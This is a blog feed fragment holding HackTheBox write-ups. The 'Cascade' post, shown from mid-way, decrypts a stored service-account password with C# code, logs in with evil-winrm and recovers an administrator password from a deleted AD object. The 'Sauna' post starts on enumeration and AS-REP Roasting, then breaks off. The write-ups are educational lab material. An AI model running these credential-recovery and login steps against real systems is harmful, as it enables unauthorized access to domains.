&lt;p&gt;Under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/audit/&lt;/code&gt;, we have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CascAudit.exe&lt;/code&gt; and many &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dll&lt;/code&gt; files.&lt;/p&gt;

&lt;h3 id=&quot;encrypted-password-from-database&quot;&gt;Encrypted Password from database&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We found inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap&lt;/code&gt; table encrypt password of arksvc account : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BQO5l5Kj9MdErXx6Q6AGOw==&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-DB.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;review-code-cascauditexe-&quot;&gt;Review Code CascAudit.exe :&lt;/h4&gt;
&lt;p&gt;We use ILSpy tool to decompile the program CascAudit.exe and we have the key used for the encryption and decryption of arksvc account password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c4scadek3y654321&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-ilspy_program.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But we need to recover the complete function of decryption to discover the password.&lt;/p&gt;

&lt;p&gt;This function is present in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CascCrypto.dll&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-ilspy_function.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What we learn here is that to encrypt a string, we use the following :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Key = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c4scadek3y654321&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;initVector = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1tdyjCbY1Ix49842&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;keySize = &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So we have the possiblity to decrypt the hash from function DecryptString.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	public static string DecryptString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;string EncryptedString, string Key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		//Discarded unreachable code: IL_009e
		byte[] array &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Convert.FromBase64String&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EncryptedString&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		Aes aes &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Aes.Create&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.KeySize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 128&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.BlockSize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 128&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.IV &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Encoding.UTF8.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1tdyjCbY1Ix49842&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.Mode &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; CipherMode.CBC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.Key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Encoding.UTF8.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		using &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MemoryStream stream &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new MemoryStream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			using &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CryptoStream cryptoStream &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new CryptoStream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;stream, aes.CreateDecryptor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;, CryptoStreamMode.Read&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				byte[] array2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new byte[checked&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array.Length - 1 + 1&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				cryptoStream.Read&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array2, 0, array2.Length&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;Encoding.UTF8.GetString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;decrypting-password-1&quot;&gt;Decrypting Password&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We create a new cs project with visual-studio and insert only the functions we need.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Utils.cs :&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;using System&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
using System.IO&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
using System.Security.Cryptography&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
using System.Text&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

public class Crypto
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
	public const string DefaultIV &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1tdyjCbY1Ix49842&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	public const int Keysize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 128&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	public static string EncryptString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;string Plaintext, string Key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		byte[] bytes &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Encoding.UTF8.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Plaintext&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		Aes aes &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Aes.Create&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.BlockSize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 128&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.KeySize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 128&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.IV &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Encoding.UTF8.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1tdyjCbY1Ix49842&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.Key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Encoding.UTF8.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.Mode &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; CipherMode.CBC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		using &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MemoryStream memoryStream &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new MemoryStream&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			using &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CryptoStream cryptoStream &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new CryptoStream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;memoryStream, aes.CreateEncryptor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;, CryptoStreamMode.Write&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				cryptoStream.Write&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bytes, 0, bytes.Length&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				cryptoStream.FlushFinalBlock&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;Convert.ToBase64String&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;memoryStream.ToArray&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

	public static string DecryptString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;string EncryptedString, string Key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
		//Discarded unreachable code: IL_009e
		byte[] array &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Convert.FromBase64String&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EncryptedString&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		Aes aes &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Aes.Create&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.KeySize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 128&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.BlockSize &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 128&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.IV &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Encoding.UTF8.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1tdyjCbY1Ix49842&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.Mode &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; CipherMode.CBC&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		aes.Key &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Encoding.UTF8.GetBytes&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		using &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MemoryStream stream &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new MemoryStream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
			using &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CryptoStream cryptoStream &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new CryptoStream&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;stream, aes.CreateDecryptor&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;, CryptoStreamMode.Read&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
				byte[] array2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; new byte[checked&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array.Length - 1 + 1&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				cryptoStream.Read&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array2, 0, array2.Length&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
				&lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;Encoding.UTF8.GetString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;array2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
			&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Program.cs :&lt;/strong&gt; We pass the hash value like EncryptedString and the key to call the function DecryptString and result in console the plaintext password.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;﻿using System&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

namespace Cascade_Decrypt_Password_arksvc
&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    class Program
    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        static void Main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;string[] args&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            Console.WriteLine&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Crypto.DecryptString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;BQO5l5Kj9MdErXx6Q6AGOw==&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;c4scadek3y654321&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The password decrypted : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;w3lc0meFr31nd&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-decrypt.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-winrm-login-1&quot;&gt;Remote Service WinRM login&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; arksvc &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; w3lc0meFr31nd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;5-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[5] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;admintemp-exploitation-from-recycle-bin&quot;&gt;AdminTemp Exploitation from Recycle-Bin&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We identified ArkSvc account was being used to move the TempAdmin account to the recycle bin.&lt;/p&gt;

&lt;p&gt;TempAdmin for Reminder has the same password as the administrator.&lt;/p&gt;

&lt;h3 id=&quot;encoded-password-from-attribute-1&quot;&gt;Encoded Password from attribute&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Let’s take a look at the properties of this account.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;PS c:\Users\arksvc\Documents&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;get-addomain | &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;DeletedObjectsContainer
&lt;span class=&quot;gp&quot;&gt;PS c:\Users\arksvc\Documents&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Get-ADObject &lt;span class=&quot;nt&quot;&gt;-filter&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-includeDeletedObjects&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-property&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-bin.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-bin2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have the same attribute under AdminTemp &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cascadeLegacyPwd&lt;/code&gt; and we grab the hash password in base64 : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;YmFDVDNyMWFOMDBkbGVz&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;decoding-password-1&quot;&gt;Decoding Password&lt;/h3&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;command base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; passwd2.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We found the password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baCT3r1aN00dles&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-decode2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-winrm-login-and-flag-root&quot;&gt;Remote Service WinRM login and Flag root&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We get full control of Cascade machine.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.182 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrator &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; baCT3r1aN00dles
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cascade/HTB-Images-Cascade-flag_root.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Your most unhappy customers are your greatest source of learning.&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;Bill Gates&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="WINDOWS" /><category term="MEDIUM" /><category term="ACTIVE-DIRECTORY EXPLOITATION" /><category term="ENUMERATION" /><category term="REVIEW CODE" /><category term="PASSWORD DECRYPT" /><summary type="html">Ref°: HTB-12-Machine</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/cascade/HTB-Badge-Cascade.png" /><media:content medium="image" url="/assets/images/cascade/HTB-Badge-Cascade.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Sauna Machine</title><link href="/posts/HTB-11-Pentest-Sauna/" rel="alternate" type="text/html" title="Write-up Sauna Machine" /><published>2020-07-18T11:00:00+02:00</published><updated>2020-07-18T11:00:00+02:00</updated><id>/posts/HTB-11-Pentest-Sauna</id><content type="html" xml:base="/posts/HTB-11-Pentest-Sauna/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-11-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Sauna is a Windows machine that highlights the enumeration of users through the web and ldap service and the practice of the AS-REP Roasting attack (Kerberos service) with work around usernames format to find our first credential.
This allows us to have access on the machine with evil-winrm tool and gain a foothold.&lt;/p&gt;

&lt;p&gt;Lateral movement on svc_loanmgr is possible through the configuration like Autologon. This brings to light her password in clear in regedit.&lt;/p&gt;

&lt;p&gt;Privilege escalation is possible from svc_loanmgr. We can perform DCSync attack and find the hash of the administrator. Pass the Hash Attack help us to be authenticated without administrator password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Information-Sauna.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;check-all-services&quot;&gt;Check all services&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We find interesting services ; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dns&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kerberos&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smb&lt;/code&gt; on their usual ports.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;website-iis&quot;&gt;Website IIS&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-web.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Many username present under about page : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Fegus Smith, Shaun Coins, Hugo Bear, Bowie Taylor, Sophie Driver, Steven Kerb&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-webenum.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;enumerate-ldap-service-from-ldap-search-script&quot;&gt;Enumerate LDAP service from ldap-search script&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Ldap service give us essential informations with nmap script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldap-search&lt;/code&gt; on port 389.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; ldap-search 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 389
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-ldapenum.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;exploit-active-directory-machine&quot;&gt;Exploit Active Directory Machine&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We have much possitiblity to exploit Active-Directory Machine.&lt;/p&gt;

&lt;p&gt;Reference - Active-Directory exploit toolbox : &lt;a href=&quot;https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md&quot;&gt;https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here our target is kerberos service. This service is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. We have several possible attacks : AS-Rep Roasting / Kerberoasting / Pass the key / Pass the ticket / Silver ticket / Golden ticket&lt;/p&gt;

&lt;p&gt;We use AS-Rep Roasting attack to gain a foothold. This technique is simple, that allows to retrieve hash (NTLM) from users of a domain that do not require kerberos pre-authentication. The hash can then be cracked via JohnTheRipper for example. By default pre-authentication is enabled but can be disabled in the user properties via the Active Directory.&lt;/p&gt;

&lt;p&gt;Reference - AS-Rep Roasting attack : &lt;a href=&quot;https://beta.hackndo.com/kerberos-asrep-roasting/&quot;&gt;https://beta.hackndo.com/kerberos-asrep-roasting/&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;as-rep-roasting-attack&quot;&gt;As-Rep Roasting Attack&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We create the userfile with all combinations of username format we which can be found in the Active-Directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-userfile.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

